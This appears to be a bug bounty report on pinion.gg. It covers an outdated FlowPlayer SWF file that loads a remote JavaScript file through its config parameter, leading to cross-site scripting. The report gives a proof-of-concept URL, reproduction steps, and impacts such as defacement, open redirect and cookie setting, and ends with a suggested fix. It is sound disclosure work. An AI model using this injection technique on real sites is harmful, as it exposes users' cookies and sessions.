##Description
Hi. Today i looked to some outscope subdomains *.pinion.gg for recon purposes.
I discovered an interesting file on http://templ4d2.pinion.gg/motd2.manifest with next content:
```
CACHE MANIFEST
# 2014-07-07
CACHE:
http://bin.pinion.gg/bin/companions.min.js
http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf
http://vox-static.liverail.com/crossdomain.xml

```

One string attracted my attention - http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf
I submitted previously some vulnerabilities connected with this file to other programs, so easily determined that it is an outdated version of FlowPlayer (https://github.com/flowplayer/), vulnerable to XSS through remote file inclusion.

##POC
http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://████████/test.js
Just visit this link. Player will load my remote .js file from the my host, and display few popups with document.cookie and document.domain payloads.

##Impact
The vulnerable file is hosted on out-scope subdomain, so i thinked, how it can affect security of main domains.
1) Using bin.pinion.gg deface. Because attacker can execute any JS, he can deface the page by arbitrary content
2) Using Open Redirect through `window.location` js payload.
3) Using setting cookie cross-domain. In this case the attacker can set arbitrary cookies to the pinion.gg or cp-ng.pinion.gg.
4) If this file is used in some instance to display some content, ads, etc. - then the instance is vulnerable to XSS.

##Reproduction steps
You just need to place the malicious file to the remote host, like in this example:
http://████/test.js
and append the url to the
```
http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=
```
as parameter.

##Suggested fix
I recommend you to update FlowPlayer to the latest version, or remove if not used.
